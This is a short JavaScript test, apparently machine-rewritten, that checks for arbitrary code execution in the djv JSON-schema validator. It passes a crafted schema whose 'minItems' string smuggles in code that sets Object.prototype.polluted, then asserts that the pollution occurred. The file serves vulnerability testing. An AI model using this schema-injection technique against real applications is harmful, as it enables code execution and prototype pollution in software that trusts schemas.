const v27 = () => {
    const v15 = expect.assertions(2);
    v15;
    const djv = require('djv');
    const v16 = {};
    const v17 = v16.polluted;
    const v18 = expect(v17);
    const v19 = v18.toBe(undefined);
    v19;
    try {
        const env = new djv();
        const evilSchema = JSON.parse('{"common":{"type":"array", "minItems":"1 + (Object.prototype.polluted = `yes`)"}}');
        const v20 = env.addSchema('test', evilSchema);
        v20;
        const v21 = { type: 'custom' };
        const v22 = env.validate('test#/common', v21);
        v22;
    } catch (error) {
    }
    const v23 = {};
    const v24 = v23.polluted;
    const v25 = expect(v24);
    const v26 = v25.toBe('yes');
    v26;
};
const v28 = test('Arbitrary code execution in  djv', v27);
v28;